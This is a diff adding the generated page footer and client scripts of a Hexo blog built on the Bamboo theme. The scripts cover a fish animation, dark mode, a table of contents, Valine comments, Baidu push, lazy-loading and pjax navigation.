+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  
+    <!-- 底部鱼儿跳动效果，依赖于jquery-->
+<div id="j-fish-skip" style=" position: relative;height: 153px;width: auto;"></div>
+<script>
+  var RENDERER = {
+    POINT_INTERVAL: 5,
+    FISH_COUNT: 3,
+    MAX_INTERVAL_COUNT: 50,
+    INIT_HEIGHT_RATE: .5,
+    THRESHOLD: 50,
+    FISH_COLOR: '',
+    init: function () {
+      this.setFishColor(); this.setParameters(), this.reconstructMethods(), this.setup(), this.bindEvent(), this.render()
+    },
+    setFishColor: function () {
+      let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+      if (isDark) {
+        this.FISH_COLOR = '#222'; // 暗黑色，有时间把这整成一个变量
+      } else {
+        this.FISH_COLOR = '' || 'rgba(66, 185, 133, 0.8)';
+      }
+    },
+    setParameters: function () {
+      this.$window = $(window), this.$container = $("#j-fish-skip"), this.$canvas = $("<canvas />"), this.context = this.$canvas.appendTo(this.$container).get(0).getContext("2d"), this.points = [], this.fishes = [], this.watchIds = []
+    },
+    createSurfacePoints: function () {
+      var t = Math.round(this.width / this.POINT_INTERVAL);
+      this.pointInterval = this.width / (t - 1), this.points.push(new SURFACE_POINT(this, 0));
+      for (var i = 1; i < t; i++) {
+        var e = new SURFACE_POINT(this, i * this.pointInterval),
+          h = this.points[i - 1];
+        e.setPreviousPoint(h), h.setNextPoint(e), this.points.push(e)
+      }
+    },
+    reconstructMethods: function () {
+      this.watchWindowSize = this.watchWindowSize.bind(this), this.jdugeToStopResize = this.jdugeToStopResize.bind(this), this.startEpicenter = this.startEpicenter.bind(this), this.moveEpicenter = this.moveEpicenter.bind(this), this.reverseVertical = this.reverseVertical.bind(this), this.render = this.render.bind(this)
+    },
+    setup: function () {
+      this.points.length = 0, this.fishes.length = 0, this.watchIds.length = 0, this.intervalCount = this.MAX_INTERVAL_COUNT, this.width = this.$container.width(), this.height = this.$container.height(), this.fishCount = this.FISH_COUNT * this.width / 500 * this.height / 500, this.$canvas.attr({
+        width: this.width,
+        height: this.height
+      }), this.reverse = !1, this.fishes.push(new FISH(this)), this.createSurfacePoints()
+    },
+    watchWindowSize: function () {
+      this.clearTimer(), this.tmpWidth = this.$window.width(), this.tmpHeight = this.$window.height(), this.watchIds.push(setTimeout(this.jdugeToStopResize, this.WATCH_INTERVAL))
+    },
+    clearTimer: function () {
+      for (; this.watchIds.length > 0;) clearTimeout(this.watchIds.pop())
+    },
+    jdugeToStopResize: function () {
+      var t = this.$window.width(),
+        i = this.$window.height(),
+        e = t == this.tmpWidth && i == this.tmpHeight;
+      this.tmpWidth = t, this.tmpHeight = i, e && this.setup()
+    },
+    bindEvent: function () {
+      this.$window.on("resize", this.watchWindowSize), this.$container.on("mouseenter", this.startEpicenter), this.$container.on("mousemove", this.moveEpicenter)
+    },
+    getAxis: function (t) {
+      var i = this.$container.offset();
+      return {
+        x: t.clientX - i.left + this.$window.scrollLeft(),
+        y: t.clientY - i.top + this.$window.scrollTop()
+      }
+    },
+    startEpicenter: function (t) {
+      this.axis = this.getAxis(t)
+    },
+    moveEpicenter: function (t) {
+      var i = this.getAxis(t);
+      this.axis || (this.axis = i), this.generateEpicenter(i.x, i.y, i.y - this.axis.y), this.axis = i
+    },
+    generateEpicenter: function (t, i, e) {
+      if (!(i < this.height / 2 - this.THRESHOLD || i > this.height / 2 + this.THRESHOLD)) {
+        var h = Math.round(t / this.pointInterval);
+        h < 0 || h >= this.points.length || this.points[h].interfere(i, e)
+      }
+    },
+    reverseVertical: function () {
+      this.reverse = !this.reverse;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].reverseVertical()
+    },
+    controlStatus: function () {
+      for (var t = 0, i = this.points.length; t < i; t++) this.points[t].updateSelf();
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].updateNeighbors();
+      this.fishes.length < this.fishCount && 0 == --this.intervalCount && (this.intervalCount = this.MAX_INTERVAL_COUNT, this.fishes.push(new FISH(this)))
+    },
+    render: function () {
+      requestAnimationFrame(this.render), this.controlStatus(), this.context.clearRect(0, 0, this.width, this.height), this.context.fillStyle = this.FISH_COLOR;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].render(this.context);
+      this.context.save(), this.context.globalCompositeOperation = "xor", this.context.beginPath(), this.context.moveTo(0, this.reverse ? 0 : this.height);
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].render(this.context);
+      this.context.lineTo(this.width, this.reverse ? 0 : this.height), this.context.closePath(), this.context.fill(), this.context.restore()
+    }
+  },
+  SURFACE_POINT = function (t, i) {
+    this.renderer = t, this.x = i, this.init()
+  };
+  SURFACE_POINT.prototype = {
+    SPRING_CONSTANT: .03,
+    SPRING_FRICTION: .9,
+    WAVE_SPREAD: .3,
+    ACCELARATION_RATE: .01,
+    init: function () {
+      this.initHeight = this.renderer.height * this.renderer.INIT_HEIGHT_RATE, this.height = this.initHeight, this.fy = 0, this.force = {
+        previous: 0,
+        next: 0
+      }
+    },
+    setPreviousPoint: function (t) {
+      this.previous = t
+    },
+    setNextPoint: function (t) {
+      this.next = t
+    },
+    interfere: function (t, i) {
+      this.fy = this.renderer.height * this.ACCELARATION_RATE * (this.renderer.height - this.height - t >= 0 ? -1 : 1) * Math.abs(i)
+    },
+    updateSelf: function () {
+      this.fy += this.SPRING_CONSTANT * (this.initHeight - this.height), this.fy *= this.SPRING_FRICTION, this.height += this.fy
+    },
+    updateNeighbors: function () {
+      this.previous && (this.force.previous = this.WAVE_SPREAD * (this.height - this.previous.height)), this.next && (this.force.next = this.WAVE_SPREAD * (this.height - this.next.height))
+    },
+    render: function (t) {
+      this.previous && (this.previous.height += this.force.previous, this.previous.fy += this.force.previous), this.next && (this.next.height += this.force.next, this.next.fy += this.force.next), t.lineTo(this.x, this.renderer.height - this.height)
+    }
+  };
+  var FISH = function (t) {
+    this.renderer = t, this.init()
+  };
+  FISH.prototype = {
+    GRAVITY: .4,
+    init: function () {
+      this.direction = Math.random() < .5, this.x = this.direction ? this.renderer.width + this.renderer.THRESHOLD : -this.renderer.THRESHOLD, this.previousY = this.y, this.vx = this.getRandomValue(4, 10) * (this.direction ? -1 : 1), this.renderer.reverse ? (this.y = this.getRandomValue(1 * this.renderer.height / 10, 4 * this.renderer.height / 10), this.vy = this.getRandomValue(2, 5), this.ay = this.getRandomValue(.05, .2)) : (this.y = this.getRandomValue(6 * this.renderer.height / 10, 9 * this.renderer.height / 10), this.vy = this.getRandomValue(-5, -2), this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1, this.theta = 0, this.phi = 0
+    },
+    getRandomValue: function (t, i) {
+      return t + (i - t) * Math.random()
+    },
+    reverseVertical: function () {
+      this.isOut = !this.isOut, this.ay *= -1
+    },
+    controlStatus: function (t) {
+      this.previousY = this.y, this.x += this.vx, this.y += this.vy, this.vy += this.ay, this.renderer.reverse ? this.y > this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy -= this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(.05, .2)), this.isOut = !1) : this.y < this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy += this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1), this.isOut || (this.theta += Math.PI / 20, this.theta %= 2 * Math.PI, this.phi += Math.PI / 30, this.phi %= 2 * Math.PI), this.renderer.generateEpicenter(this.x + (this.direction ? -1 : 1) * this.renderer.THRESHOLD, this.y, this.y - this.previousY), (this.vx > 0 && this.x > this.renderer.width + this.renderer.THRESHOLD || this.vx < 0 && this.x < -this.renderer.THRESHOLD) && this.init()
+    },
+    render: function (t) {
+      t.save(), t.translate(this.x, this.y), t.rotate(Math.PI + Math.atan2(this.vy, this.vx)), t.scale(1, this.direction ? 1 : -1), t.beginPath(), t.moveTo(-30, 0), t.bezierCurveTo(-20, 15, 15, 10, 40, 0), t.bezierCurveTo(15, -10, -20, -15, -30, 0), t.fill(), t.save(), t.translate(40, 0), t.scale(.9 + .2 * Math.sin(this.theta), 1), t.beginPath(), t.moveTo(0, 0), t.quadraticCurveTo(5, 10, 20, 8), t.quadraticCurveTo(12, 5, 10, 0), t.quadraticCurveTo(12, -5, 20, -8), t.quadraticCurveTo(5, -10, 0, 0), t.fill(), t.restore(), t.save(), t.translate(-3, 0), t.rotate((Math.PI / 3 + Math.PI / 10 * Math.sin(this.phi)) * (this.renderer.reverse ? -1 : 1)), t.beginPath(), this.renderer.reverse ? (t.moveTo(5, 0), t.bezierCurveTo(10, 10, 10, 30, 0, 40), t.bezierCurveTo(-12, 25, -8, 10, 0, 0)) : (t.moveTo(-5, 0), t.bezierCurveTo(-10, -10, -10, -30, 0, -40), t.bezierCurveTo(12, -25, 8, -10, 0, 0)), t.closePath(), t.fill(), t.restore(), t.restore(), this.controlStatus(t)
+    }
+  }, $(function () {
+    RENDERER.init()
+    $('.dark').click(function () {
+      setTimeout(() => {
+        RENDERER.setFishColor();
+        RENDERER.context.fill();
+      });
+    })
+  });
+</script>
+  
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-copyright">
+            <p>Copyright © 2019 - 2020 <a target="_blank" rel="noopener" href="https://github.com/yuang01">yuang01</a> | Powered by <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a> | Theme <a target="_blank" rel="noopener" href="https://github.com/yuang01/theme">Bamboo</a> </p>
+
+          </div>
+        
+      
+        
+          
+            <!-- 不蒜子统计 -->
+            <!-- 不蒜子统计 -->
+<span id="busuanzi_container_site_pv">
+      <i class="fas fa-eye" aria-hidden="true"></i>本站总访问量：<span id="busuanzi_value_site_pv"></span> 次
+</span>
+<span class="post-meta-divider">|</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+      <i class="fas fa-users" aria-hidden="true"></i>本站访客数：<span id="busuanzi_value_site_uv"></span> 人
+</span>
+
+          
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+      <div class="dark">
+  <div class="dark-content">
+    <i class="fas fa-moon" aria-hidden="true"></i>
+    <!-- <span>关灯</span> -->
+  </div>
+  
+</div>
+
+<script>
+  $(function() {
+    let isDark = JSON.parse(localStorage.getItem('dark'))  || JSON.parse('false');
+    if (isDark) {
+      $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-lightbulb" aria-hidden="true"></i>
+          </div>
+          `
+        );
+    }
+    $('.dark').click(function() {
+      if ($(document.body).is('.darkModel')) {
+        $(document.body).removeClass('darkModel');
+        localStorage.setItem('dark', false);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-moon" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      } else {
+        $(document.body).addClass('darkModel');
+        localStorage.setItem('dark', true);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-lightbulb" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      }
+    })
+  })
+</script>
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="/js/fancybox/jquery.fancybox.min.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <!-- 背景彩带 -->
+    
+      <script type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<!-- <link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script> -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.css">
+
+<script>
+  var headerEl = 'h2, h3, h4',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -70,
+    // headingsOffset: -($(window).height() * 0.4 - 45),
+    headingsOffset: -($(window).height() * 0.4 - 70),
+    // positionFixedSelector: '.toc-main',
+    // positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    orderedList: true,
+    collapseDepth: 20,
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 150) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('side_toc')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  /* .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  } */
+</style>
+ 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://unpkg.com/v-plugs-ayu/lib/ayu.css">
+  <script src="https://unpkg.com/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = '复制';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "代码已复制，请遵守相关授权协议。",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://unpkg.com/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+    <!-- 弹幕所需的css和js -->
+    
+<!-- 具体js，请前往valine/script.ejs查看 -->
+
+    <script>
+  var requiredFields = '';
+  requiredFields = requiredFields.split(',');
+  comment_el = '.comment';
+  let looperValine = null;
+  load_valine = function () {
+    if ($(comment_el).length) {
+      var valine = new Valine({
+        el: '#vcomment',
+        path: window.location.pathname,
+        notify: false,
+        verify: false,
+        app_id: "",
+        app_key: "",
+        placeholder: "客官，说点什么吧",
+        avatar: "",
+        master: "",   //博主邮箱md5
+        tagMeta: ["博主","小伙伴","访客"],     //标识字段名
+        friends: "",
+        metaPlaceholder: { "nick": "昵称/QQ号", "mail": "邮箱" },
+        requiredFields: requiredFields,
+        enableQQ: true,
+      });
+      function debounce(fn) {
+        var timerID = null
+        return function () {
+          var arg = arguments[0]   //获取事件
+          if (timerID) {
+            clearTimeout(timerID)
+          }
+          timerID = setTimeout(function () {
+            fn(arg)              //事件传入函数
+          }, 200)
+        }
+      }
+      //查询评论 valine.Q('*').limit(7) -- 查询所有，限制7条, 下面的的代码是查询当前页面
+      var themeDanmu = eval('false');
+      var themeLoop = eval('false');
+      var themeLooperTime = '5000' || 5000;
+      var speed = '40' || 20;
+      var isBarrager = true;
+      if (themeDanmu == true) {
+        do_barrager();
+        if ($('.danmuBox').length <= 0) {
+          $('.navbar').append('<div class="danmuBox"><div class="danmuBtn open"><span class="danmuCircle"></span><span class="danmuText">弹幕</span></div></div>');
+        }
+        $('.danmuBtn').on('click', debounce(
+          function () {
+            if ($('.danmuBtn').hasClass('open')) {
+              $('.danmuBtn').removeClass('open')
+              clearInterval(looperValine);
+              $.fn.barrager.removeAll();
+            } else {
+              $('.danmuBtn').addClass("open");
+              do_barrager();
+            }
+          }
+        ))
+      }
+      function do_barrager() {
+        isBarrager && valine.Q(window.location.pathname).find().then(function (comments) {
+          // var num = 0; // 可以记录条数，循环调用的时候只取最新的评论放入弹幕中
+          var run_once = true;
+          var looper_time = themeLooperTime;
+          var total = comments.length;
+          // var looper = null;
+          var index = 0;
+          if (total > 0) {
+            barrager();
+          } else {
+            // 当评论数为0的时候，自动关闭弹幕
+            // $('.danmuBtn').removeClass('open');
+          }
+          function barrager() {
+            if (run_once) {
+              //如果是首次执行,则设置一个定时器,并且把首次执行置为false
+              looperValine = setInterval(barrager, looper_time);
+              run_once = false;
+            }
+            var content = comments[index]._serverData.comment;
+            var email = comments[index]._serverData.mail;
+            var link = comments[index]._serverData.link;
+            var newcontent = content.substring(0, 50).replace(/<[^>]+>/g, "");
+            //发布一个弹幕
+            const item = {
+              img: `https://q1.qlogo.cn/g?b=qq&nk=${email}&s=640`, //图片 
+              info: newcontent, //文字 
+              href: link, //链接 
+              close: true, //显示关闭按钮 
+              speed: speed, //延迟,单位秒,默认6 
+              color: '#fff', //颜色,默认白色 
+              old_ie_color: '#000000', //ie低版兼容色,不能与网页背景相同,默认黑色
+            }
+            $('body').barrager(item);
+            //索引自增
+            index++;
+            //所有弹幕发布完毕，清除计时器。
+            if (index == total) {
+              clearInterval(looperValine);
+              if (themeLoop === true) {
+                setTimeout(function () {
+                  do_barrager();
+                }, 5000);
+              } else {
+                $('.danmuBtn').removeClass('open');
+              }
+              return false;
+            }
+
+          }
+        })
+      }
+    }
+  };
+  $(document).ready(load_valine);
+  document.addEventListener('pjax:send', function (e) {
+    
+  })
+  document.addEventListener('pjax:complete', function () {
+    load_valine();
+  });
+</script>
+
+  
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+  
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 999; pointer-events: none;" ></canvas>
+    <script src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+    <script src="/js/cursor/explosion.min.js"></script>
+  
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" data-pjax></script>
+
+
+<!-- 轮播图标签 -->
+<script>
+  var bambooSwiperTag = {};
+  function load_swiper() {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    loadCSS("https://unpkg.com/swiper@6/swiper-bundle.min.css")
+    loadScript("https://unpkg.com/swiper@6/swiper-bundle.min.js").then(() => {
+      pjax_swiper();
+    });
+  }
+
+  load_swiper();
+
+  function pjax_swiper() {
+    bambooSwiperTag.swiper = new Swiper('.post-swiper-container', {
+      slidesPerView: 'auto',
+      spaceBetween: 8,
+      centeredSlides: true,
+      loop: true,
+      autoplay: true ? {
+        delay: 3000,
+        stopOnLastSlide: false,
+        disableOnInteraction: false,
+      } : false,
+      pagination: {
+        el: '.swiper-pagination',
+        clickable: true,
+      },
+      navigation: {
+        nextEl: '.swiper-button-next',
+        prevEl: '.swiper-button-prev',
+      },
+      on:{
+        init: function(){
+          swiperAnimateCache(this); //隐藏动画元素 
+          swiperAnimate(this); //初始化完成开始动画
+        }, 
+        slideChangeTransitionEnd: function(){ 
+          swiperAnimate(this); //每个slide切换结束时也运行当前slide动画
+          //this.slides.eq(this.activeIndex).find('.ani').removeClass('ani'); 动画只展现一次，去除ani类名
+        } 
+      }
+    });
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    if (typeof bambooSwiperTag.swiper === "undefined") {
+      load_swiper();
+    } else {
+      pjax_swiper();
+    }
+  });
+</script>
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
